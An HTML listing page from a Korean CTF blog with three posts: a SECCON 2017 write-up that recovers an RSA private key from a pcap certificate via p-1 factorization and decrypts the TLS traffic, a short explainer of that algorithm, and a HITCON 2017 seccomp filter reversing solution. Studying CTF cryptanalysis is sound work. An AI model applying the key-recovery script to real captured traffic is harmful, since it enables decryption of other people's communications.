<h4 id="Related-problem"><a href="#Related-problem" class="headerlink" title="Related problem"></a>Related problem</h4><p>SECCON 2017 - Online candy store</p>

      
    </div>
</article>

    </li>
  
    <li>
      <article class='ListView'>
    <header class="title">
      
        <h1>
          <a href="/2018/01/05/SECCON-2017-Very-smooth/">SECCON 2017 - Very smooth</a>
        </h1>
      
      <div class='ListMeta'>
  <time datetime="2018-01-04T21:19:45.000Z" itemprop="datePublished">
    2018-01-05
  </time>
  
  
  / 
  <ul>
    
  <li class="meta-text">
  { <a href="/categories/crypto/">Crypto</a> }
  </li>


  </ul>
  
</div>

    </header>
    <div>
      
        <h4 id="Write-up"><a href="#Write-up" class="headerlink" title="Write-up"></a>Write-up</h4><p>pcap 파일을 열어보면 ssl 통신으로 패킷을 주고받은 것을 확인할 수 있다. server hello 패킷을 보면 index.html은 TLS_RSA_WITH_AES_128_CBC_SHA 방식으로 암호화한다. 문제 이름이 “Very smooth” 인걸로 봐서 RSA 암호화에 사용되는 소수 p,q 가 smooth number 라는 힌트를 준 것 같다. server hello 패킷에서 인증서를 덤프하고 p-1 factorization 알고리즘으로 N을 인수 분해하여 private key를 알아낼 수 있었다.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@ubuntu:~<span class="comment"># python sovle.py </span></span><br><span class="line">p : 0xe171c91c9e775f06802d83cbf21643a137b576a582e1fee5bbe1566ba5c532400717dfaa2122229c440000000000000000000000000000000000000000000001L</span><br></pre></td></tr></table></figure>
<p>와이어 샤크에서 ssl key 등록하는 방법은 아래 블로그를 참고하여 index.html을 복호화하였다.<br><a href="https://secuof.wordpress.com/2014/12/12/wireshark%EB%A5%BC-%EC%9D%B4%EC%9A%A9%ED%95%9C-ssl-%ED%8C%A8%ED%82%B7-%EB%B6%84%EC%84%9D/" target="_blank" rel="noopener">WireShark를 이용한 SSL 패킷 분석</a><br><br><br></p>
<h4 id="Solve-py"><a href="#Solve-py" class="headerlink" title="Solve.py"></a>Solve.py</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">exkey = <span class="string">"""-----BEGIN PUBLIC KEY-----</span></span><br><span class="line"><span class="string">MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDVRqqCXPYd6Xdl9GT7/kiJrYvy</span></span><br><span class="line"><span class="string">8lohddAsi28qwMXCe2cDWuwZKzdB3R9NEnUxsHqwEuuGJBwJwIFJnmnvWurHjcYj</span></span><br><span class="line"><span class="string">DUddp+4X8C9jtvCaLTgd+baSjo2eB0f+uiSL/9/4nN+vR3FliRm2mByeFCjppTQl</span></span><br><span class="line"><span class="string">yioxCqbXYIMxGO4NcQIDAQAB</span></span><br><span class="line"><span class="string">-----END PUBLIC KEY-----</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">pubkey = RSA.importKey(exkey)</span><br><span class="line">n = pubkey.n</span><br><span class="line">e = pubkey.e</span><br><span class="line"></span><br><span class="line">a,B = <span class="number">2</span>,<span class="number">10000</span></span><br><span class="line">gcd_result,i = <span class="number">1</span>,<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> gcd_result&lt;=<span class="number">1</span>:</span><br><span class="line">	i += <span class="number">1</span></span><br><span class="line">	<span class="keyword">if</span> i&gt;B:</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">	a = pow(a,i,n)</span><br><span class="line">	gcd_result = GCD(a<span class="number">-1</span>,n)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"p : "</span>+hex(gcd_result)</span><br><span class="line">p = gcd_result</span><br><span class="line">q = n/p</span><br><span class="line">d = inverse(e,(p<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br><span class="line">RSAobj = RSA.construct((n,e,d))</span><br><span class="line">privKey = RSAobj.exportKey(<span class="string">'PEM'</span>)</span><br><span class="line">f = open(<span class="string">'privKey.pem'</span>,<span class="string">'w'</span>)</span><br><span class="line">f.write(privKey)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>
      
    </div>
</article>

    </li>
  
    <li>
      <article class='ListView'>
    <header class="title">
      
        <h1>
          <a href="/2018/01/05/p-1-factorization/">p-1 factorization</a>
        </h1>
      
      <div class='ListMeta'>
  <time datetime="2018-01-04T18:44:46.000Z" itemprop="datePublished">
    2018-01-05
  </time>
  
  
  / 
  <ul>
    
  <li class="meta-text">
  { <a href="/categories/crypto/">Crypto</a> }
  </li>


  </ul>
  
</div>

    </header>
    <div>
      
        <p>p-1 factorization 알고리즘은 N = pq (p,q 는 소수) 에서 N을 인수 분해하는 알고리즘이다.<br><br></p>
<h4 id="Concept"><a href="#Concept" class="headerlink" title="Concept"></a>Concept</h4><p>페르마의 소정리에 의해 p가 소수이고 a가 p의 배수가 아니면, a<sup>p-1</sup> = 1 (mod p) 를 만족한다. 마찬가지로 a<sup>k(p-1)</sup> = 1 이므로 a<sup>k(p-1)</sup> - 1 은 p의 곱으로 표현할 수 있다. 그러면 k(p-1)의 값만 알 수 있다면 N을 분해할 수 있지만, k(p-1)을 알 수 없으므로 2!, 3!, 4! … n!(n &lt; B-smooth) 사용하고 gcd(a<sup>k(p-1)</sup> - 1,N) 을 계산하여 인수를 찾는다. 그래서 p-1 이 smooth number일 때 사용하기 적절하다.<br><br><br></p>
<h4 id="Algorithm"><a href="#Algorithm" class="headerlink" title="Algorithm"></a>Algorithm</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a,B = <span class="number">2</span>,<span class="number">10000</span></span><br><span class="line">gcd_result,i = <span class="number">1</span>,<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> gcd_result&lt;=<span class="number">1</span>:</span><br><span class="line">	i += <span class="number">1</span></span><br><span class="line">	<span class="keyword">if</span> i&gt;B:</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">	a = pow(a,i,n)</span><br><span class="line">	gcd_result = GCD(a<span class="number">-1</span>,n)</span><br></pre></td></tr></table></figure>
      
    </div>
</article>

    </li>
  
    <li>
      <article class='ListView'>
    <header class="title">
      
        <h1>
          <a href="/2018/01/02/HITCON-2017-Seccomp/">HITCON 2017 - Seccomp</a>
        </h1>
      
      <div class='ListMeta'>
  <time datetime="2018-01-02T04:52:12.000Z" itemprop="datePublished">
    2018-01-02
  </time>
  
  
  / 
  <ul>
    
  <li class="meta-text">
  { <a href="/categories/reversing/">Reversing</a> }
  </li>


  </ul>
  
</div>

    </header>
    <div>
      
        <h4 id="Write-up"><a href="#Write-up" class="headerlink" title="Write-up"></a>Write-up</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//  main.c</span></span><br><span class="line">  v6 = <span class="number">4059</span>;</span><br><span class="line">  v7 = &amp;filter;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v8, <span class="number">0</span>, <span class="number">0x30</span>uLL);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">    _isoc99_scanf(<span class="string">"%llu"</span>, &amp;v8 + i);</span><br><span class="line">  prctl(<span class="number">38</span>, <span class="number">1L</span>L, <span class="number">0L</span>L, <span class="number">0L</span>L, <span class="number">0L</span>L);</span><br><span class="line">  <span class="keyword">if</span> ( prctl(<span class="number">22</span>, <span class="number">2L</span>L, &amp;v6) )</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">"prctl"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  syscall(<span class="number">4919L</span>L, v8, v9, v10, v11, v12, v13);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Excellent! flag: hitcon&#123;%s&#125;\n"</span>, &amp;v8);</span><br></pre></td></tr></table></figure>
<p>프로그램의 소스는 간단하다. 5개의 정수를 입력받고 seccomp 필터를 통해 검사를 진행한다. seccomp 필터의 길이가 무려 4059개이므로 툴의 힘을 빌려서 빠르게 분석해보자.<br><br></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@ubuntu:~<span class="comment"># seccomp-tools dump ./seccomp </span></span><br><span class="line">1 2 3 4 5</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0001: 0x15 0x01 0x00 0x00001337  <span class="keyword">if</span> (A == 0x1337) goto 0003</span><br><span class="line"> 0002: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br><span class="line"> 0003: 0x20 0x00 0x00 0x00000010  A = args[0]</span><br><span class="line"> 0004: 0x07 0x00 0x00 0x00000000  X = A</span><br></pre></td></tr></table></figure>
<p><a href="https://github.com/david942j/seccomp-tools" target="_blank" rel="noopener">seccomp tool</a> 의 dump 기능을 이용하면 자동으로 seccomp 필터를 dump 시켜준다. dump한 필터를 보면 역시나 4058줄이나 된다. 문제 제작자도 이 코드를 한줄씩 한줄씩 직접 코딩하지 않고 특정 연산을 seccomp filter 문법으로 바꿔주는 스크립트를 통해 만들었다고 생각해 해당 필터의 패턴을 분석해보았다.<br><br></p>
<p>우선 입력한 5개의 정수가 차례대로 연산이 진행된다. args[0]~args[4]가 입력한 정수들이다. 정수는 16byte 나눠서 mem[0]~mem[3]에 들어가게 된다. mem[0]~mem[3]을 통해 복잡해보이는 연산을 거치고 마지막에 if문에서 검사를 한다.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0017: 0x60 0x00 0x00 0x00000000  A = mem[0]</span><br><span class="line">0018: 0x15 0x00 0x01 0x00000000  if (A != 0) goto 0020</span><br><span class="line">0019: 0x00 0x00 0x00 0x00010000  A = 65536</span><br><span class="line">0020: 0x24 0x00 0x00 0x00006761  A *= 0x6761</span><br><span class="line">0021: 0x07 0x00 0x00 0x00000000  X = A</span><br><span class="line">0022: 0x34 0x00 0x00 0x00010001  A /= 0x10001</span><br><span class="line">0023: 0x24 0x00 0x00 0x00010001  A *= 0x10001</span><br><span class="line">0024: 0x84 0x00 0x00 0x00000000  A = -A</span><br><span class="line">0025: 0x0c 0x00 0x00 0x0000c450  A += X</span><br><span class="line">0026: 0x15 0x00 0x01 0x00010000  if (A != 65536) goto 0028</span><br><span class="line">0027: 0x00 0x00 0x00 0x00000000  A = 0</span><br><span class="line">0028: 0x02 0x00 0x00 0x00000000  mem[0] = A</span><br></pre></td></tr></table></figure>
<p>위의 연산은 A가 65536일 경우에 예외처리가 추가된 점을 빼면 곱셉 + mod 연산이다.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0029: 0x60 0x00 0x00 0x00000001  A = mem[1]</span><br><span class="line"> 0030: 0x04 0x00 0x00 0x00006c66  A += 0x6c66</span><br><span class="line"> 0031: 0x54 0x00 0x00 0x0000ffff  A &amp;= 0xffff</span><br><span class="line"> 0032: 0x02 0x00 0x00 0x00000001  mem[1] = A</span><br></pre></td></tr></table></figure>
<p>위의 연산은 변수에 정수를 더하는 연산은 표현한 것이다. 이처럼 add,mul,xor,swap 등의 연산을 모두 seccomp filter 문법으로 표현하였고 이런 패턴들이 계속 반복되었다. 그래서 정규식을 통해 이 패턴들을 모두 찾아서 1줄 코드로 바꿔보았다.<br><br></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#replace.py</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">data = open(<span class="string">'filter.txt'</span>,<span class="string">'r'</span>).read()</span><br><span class="line"></span><br><span class="line">pMULr = <span class="string">"""A = (mem\[\d\])</span></span><br><span class="line"><span class="string">A \*= (0x[0-9a-z]+)</span></span><br><span class="line"><span class="string">X = A</span></span><br><span class="line"><span class="string">A /= 0x10001</span></span><br><span class="line"><span class="string">A \*= 0x10001</span></span><br><span class="line"><span class="string">A = -A</span></span><br><span class="line"><span class="string">A \+= X</span></span><br><span class="line"><span class="string">(mem\[\d\]) = A</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">pat  = re.compile(pMULr)</span><br><span class="line">data = pat.sub(<span class="string">"\g&lt;3&gt; = (\g&lt;1&gt;*\g&lt;2&gt;)%0x10001\n"</span>,data)</span><br><span class="line"></span><br><span class="line">pADDi = <span class="string">"""A = (mem\[\d\])</span></span><br><span class="line"><span class="string">A \+= (0x[0-9a-z]+)</span></span><br><span class="line"><span class="string">A &amp;= 0xffff</span></span><br><span class="line"><span class="string">(mem\[\d\]) = A</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">pat  = re.compile(pADDi)</span><br><span class="line">data = pat.sub(<span class="string">"\g&lt;3&gt; = (\g&lt;1&gt;+\g&lt;2&gt;)&amp;0xffff\n"</span>,data)</span><br><span class="line"></span><br><span class="line">pADDv = <span class="string">"""A = (mem\[\d\])</span></span><br><span class="line"><span class="string">X = (mem\[\d\])</span></span><br><span class="line"><span class="string">A \+= X</span></span><br><span class="line"><span class="string">A &amp;= 0xffff</span></span><br><span class="line"><span class="string">(mem\[\d\]) = A</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">pat  = re.compile(pADDv)</span><br><span class="line">data = pat.sub(<span class="string">"\g&lt;3&gt; = (\g&lt;1&gt;+\g&lt;2&gt;)&amp;0xffff\n"</span>,data)</span><br><span class="line"></span><br><span class="line">pXOR = <span class="string">"""A = (mem\[\d\])</span></span><br><span class="line"><span class="string">X = (mem\[\d\])</span></span><br><span class="line"><span class="string">A \^= X</span></span><br><span class="line"><span class="string">(mem\[\d\]) = A</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">pat  = re.compile(pXOR)</span><br><span class="line">data = pat.sub(<span class="string">"\g&lt;3&gt; = \g&lt;1&gt;^\g&lt;2&gt;\n"</span>,data)</span><br><span class="line"></span><br><span class="line">pSWAP = <span class="string">"""A = (mem\[\d\])</span></span><br><span class="line"><span class="string">X = (mem\[\d\])</span></span><br><span class="line"><span class="string">mem\[\d\] = X</span></span><br><span class="line"><span class="string">mem\[\d\] = A</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">pat  = re.compile(pSWAP)</span><br><span class="line">data = pat.sub(<span class="string">"\g&lt;1&gt;,\g&lt;2&gt; = \g&lt;2&gt;,\g&lt;1&gt;\n"</span>,data)</span><br><span class="line"></span><br><span class="line">f = open(<span class="string">'filter_a.txt'</span>,<span class="string">'w'</span>)</span><br><span class="line">f.write(data)</span><br></pre></td></tr></table></figure>
<p>filter.txt 에는 seccomp filter 코드들이 들어간다. 파이썬 스크립트를 통해 seccomp filter 문법에서 python 문법으로 모두 바꿨더니 코드양이 많이 줄어들고 반복적인 루틴이 나타났다.<br><br></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mem[0] = (mem[0]*0x6761)%0x10001</span><br><span class="line">mem[1] = (mem[1]+0x6c66)&amp;0xffff</span><br><span class="line">mem[2] = (mem[2]+0x5f65)&amp;0xffff</span><br><span class="line">mem[3] = (mem[3]*0x6b61)%0x10001</span><br><span class="line">mem[4] = mem[0]^mem[2]				- (1)</span><br><span class="line">mem[5] = mem[1]^mem[3]</span><br><span class="line">mem[4] = (mem[4]*0x665f)%0x10001</span><br><span class="line">mem[5] = (mem[4]+mem[5])&amp;0xffff</span><br><span class="line">mem[5] = (mem[5]*0x615f)%0x10001</span><br><span class="line">mem[4] = (mem[4]+mem[5])&amp;0xffff</span><br><span class="line">mem[0] = mem[0]^mem[5]			    - (2)</span><br><span class="line">mem[1] = mem[1]^mem[4]</span><br><span class="line">mem[2] = mem[2]^mem[5]</span><br><span class="line">mem[3] = mem[3]^mem[4]</span><br><span class="line">mem[1],mem[2] = mem[2],mem[1]</span><br></pre></td></tr></table></figure>
<p>위와 같은 연산이 총 8번 진행되고(8번째에서는 swap 연산 제외), mul 연산과 xor 연산후에 if문을 통한 검사가 진행되었다. 전체 루틴을 정리하자면 처음에는 64byte 변수, args[0]이 mem[0]~mem[3]에 나누어 들어간다. 그리고 8번의 encrypytion을 진행하고 간단한 mul, xor 연산후에 검사한다.<br><br></p>
<p>args[0]을 구하기 위해 처음에는 z3를 통해 해결하려고 하였지만, 자꾸 unsat이 뜨고 if문 처리가 복잡해서 역연산하여 args[0]을 구해보았다. 역연산을 진행하다 보면 mem[4],mem[5]은 mem[0]~mem[3]과 달리 if문 검사를 안하기 때문에 값을 바로 알 수 없어 역연산이 매우 복잡해보인다. 그런데 (1)에서 mem[4] = mem[0]^mem[2] 이고, (2)에서 mem[0] = mem[0]^mem[5], mem[2] = mem[2]^mem[5] 이기 때문에 mem[4]의 값을 알아낼 수 있다. mem[0]^mem[2]를 하게 되면 mem[5]의 값이 0이 되면서 mem[4]과 똑같아 지는 것이다. 이 방법으로 mem[4],mem[5]의 값을 알아내면 된다. 그리고 mul 연산은 일차 합동식의 형태를 띄고 있으므로 역원을 구하는 과정을 거쳐야 한다(0x10001은 소수이므로 역원이 무조건 존재함).<br><br></p>
<h4 id="Solve-py"><a href="#Solve-py" class="headerlink" title="Solve.py"></a>Solve.py</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#solve.py</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> inverse</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Inverse</span><span class="params">(m,p)</span>:</span></span><br><span class="line">	<span class="keyword">if</span> m==<span class="number">0</span>:</span><br><span class="line">		m=<span class="number">65536</span></span><br><span class="line">	m = (m * inverse(p,<span class="number">0x10001</span>))%<span class="number">0x10001</span></span><br><span class="line">	<span class="keyword">if</span> m==<span class="number">65536</span>:</span><br><span class="line">		m=<span class="number">0</span></span><br><span class="line">	<span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">MUL</span><span class="params">(m,v)</span>:</span></span><br><span class="line">	<span class="keyword">if</span> m==<span class="number">0</span>:</span><br><span class="line">		m=<span class="number">65536</span></span><br><span class="line">	m = (m*v)%<span class="number">0x10001</span></span><br><span class="line">	<span class="keyword">if</span> m==<span class="number">65536</span>:</span><br><span class="line">		m=<span class="number">0</span></span><br><span class="line">	<span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">round</span><span class="params">(mem,v)</span>:</span></span><br><span class="line">	mem[<span class="number">1</span>],mem[<span class="number">2</span>] = mem[<span class="number">2</span>],mem[<span class="number">1</span>]</span><br><span class="line">	mem[<span class="number">4</span>] = mem[<span class="number">0</span>]^mem[<span class="number">2</span>]</span><br><span class="line">	mem[<span class="number">5</span>] = mem[<span class="number">1</span>]^mem[<span class="number">3</span>]</span><br><span class="line">	mem[<span class="number">4</span>] = MUL(mem[<span class="number">4</span>],v[<span class="number">4</span>])</span><br><span class="line">	mem[<span class="number">5</span>] = (mem[<span class="number">4</span>]+mem[<span class="number">5</span>])&amp;<span class="number">0xffff</span></span><br><span class="line">	mem[<span class="number">5</span>] = MUL(mem[<span class="number">5</span>],v[<span class="number">5</span>])</span><br><span class="line">	mem[<span class="number">4</span>] = (mem[<span class="number">4</span>]+mem[<span class="number">5</span>])&amp;<span class="number">0xffff</span></span><br><span class="line">	mem[<span class="number">3</span>] = mem[<span class="number">3</span>]^mem[<span class="number">4</span>]</span><br><span class="line">	mem[<span class="number">2</span>] = mem[<span class="number">2</span>]^mem[<span class="number">5</span>]</span><br><span class="line">	mem[<span class="number">1</span>] = mem[<span class="number">1</span>]^mem[<span class="number">4</span>]</span><br><span class="line">	mem[<span class="number">0</span>] = mem[<span class="number">0</span>]^mem[<span class="number">5</span>]</span><br><span class="line">	mem[<span class="number">3</span>] = Inverse(mem[<span class="number">3</span>],v[<span class="number">3</span>])</span><br><span class="line">	mem[<span class="number">2</span>] = (mem[<span class="number">2</span>]-v[<span class="number">2</span>])&amp;<span class="number">0xffff</span></span><br><span class="line">	mem[<span class="number">1</span>] = (mem[<span class="number">1</span>]-v[<span class="number">1</span>])&amp;<span class="number">0xffff</span></span><br><span class="line">	mem[<span class="number">0</span>] = Inverse(mem[<span class="number">0</span>],v[<span class="number">0</span>])</span><br><span class="line">	<span class="keyword">return</span> mem</span><br><span class="line"></span><br><span class="line">expression = open(<span class="string">'expression.txt'</span>,<span class="string">'r'</span>).read()</span><br><span class="line">regular = <span class="string">"""(mem\[0\] = \(mem\[0\]\*(0x[0-9a-z]+)\)%0x10001</span></span><br><span class="line"><span class="string">mem\[1\] = \(mem\[1\]\+(0x[0-9a-z]+)\)&amp;0xffff</span></span><br><span class="line"><span class="string">mem\[2\] = \(mem\[2\]\+(0x[0-9a-z]+)\)&amp;0xffff</span></span><br><span class="line"><span class="string">mem\[3\] = \(mem\[3\]\*(0x[0-9a-z]+)\)%0x10001</span></span><br><span class="line"><span class="string">mem\[4\] = mem\[0\]\^mem\[2\]</span></span><br><span class="line"><span class="string">mem\[5\] = mem\[1\]\^mem\[3\]</span></span><br><span class="line"><span class="string">mem\[4\] = \(mem\[4\]\*(0x[0-9a-z]+)\)%0x10001</span></span><br><span class="line"><span class="string">mem\[5\] = \(mem\[4\]\+mem\[5\]\)&amp;0xffff</span></span><br><span class="line"><span class="string">mem\[5\] = \(mem\[5\]\*(0x[0-9a-z]+)\)%0x10001</span></span><br><span class="line"><span class="string">mem\[4\] = \(mem\[4\]\+mem\[5\]\)&amp;0xffff</span></span><br><span class="line"><span class="string">mem\[0\] = mem\[0\]\^mem\[5\]</span></span><br><span class="line"><span class="string">mem\[1\] = mem\[1\]\^mem\[4\]</span></span><br><span class="line"><span class="string">mem\[2\] = mem\[2\]\^mem\[5\]</span></span><br><span class="line"><span class="string">mem\[3\] = mem\[3\]\^mem\[4\]</span></span><br><span class="line"><span class="string">mem\[1\],mem\[2\] = mem\[2\],mem\[1\])</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">regular_end = <span class="string">"""mem\[0\] = \(mem\[0\]\*(0x[0-9a-z]+)\)%0x10001</span></span><br><span class="line"><span class="string">mem\[1\] = \(mem\[1\]\+(0x[0-9a-z]+)\)&amp;0xffff</span></span><br><span class="line"><span class="string">mem\[2\] = \(mem\[2\]\+(0x[0-9a-z]+)\)&amp;0xffff</span></span><br><span class="line"><span class="string">mem\[3\] = \(mem\[3\]\*(0x[0-9a-z]+)\)%0x10001</span></span><br><span class="line"><span class="string">END"""</span></span><br><span class="line"></span><br><span class="line">pat = re.compile(regular_end)</span><br><span class="line">v1,v2,v3,v4 = map(<span class="keyword">lambda</span> a:int(a,<span class="number">16</span>),pat.findall(expression)[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">mem = [<span class="number">44702</span>,<span class="number">45409</span>,<span class="number">6003</span>,<span class="number">2695</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(mem)):</span><br><span class="line">	mem[i] ^= <span class="number">4919</span></span><br><span class="line"></span><br><span class="line">mem[<span class="number">3</span>] = Inverse(mem[<span class="number">3</span>],v4)</span><br><span class="line">mem[<span class="number">2</span>] = (mem[<span class="number">2</span>] - v3)&amp;<span class="number">0xffff</span></span><br><span class="line">mem[<span class="number">1</span>] = (mem[<span class="number">1</span>] - v2)&amp;<span class="number">0xffff</span></span><br><span class="line">mem[<span class="number">0</span>] = Inverse(mem[<span class="number">0</span>],v1)</span><br><span class="line">mem[<span class="number">1</span>],mem[<span class="number">2</span>] = mem[<span class="number">2</span>],mem[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">pat = re.compile(regular)</span><br><span class="line">results = pat.findall(expression)[::<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> r <span class="keyword">in</span> results:</span><br><span class="line">	v = map(<span class="keyword">lambda</span> a:int(a,<span class="number">16</span>),r[<span class="number">1</span>:])</span><br><span class="line">	mem = round(mem,v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> mem[:<span class="number">4</span>]</span><br></pre></td></tr></table></figure>
<p>expressio.txt 에는 처음 변수를 넣는 과정, if문 검사를 제외하고 8번째 루틴의 swap 연산을 추가한 코드가 들어간다. 정규식을 통해 8번 진행되는 encryption에서 사용하는 정수를 모두 뽑아오고 round 함수에서 역연산이 진행된다. args[0]~args[5] 까지 반복하면 flag를 구할 수 있다.</p>

      
    </div>
</article>

    </li>
  
</ul>


            <footer>
    <div>© 2016 - kirasys </div>
    <div>
    Powered by Hexo
    </div>
</footer>

        </div>
    </div>
</div>
<script src="/js/pager/dist/singlepager.js"></script>
<script>
var sp = new Pager('data-pager-shell')

</script>
</body>
</html>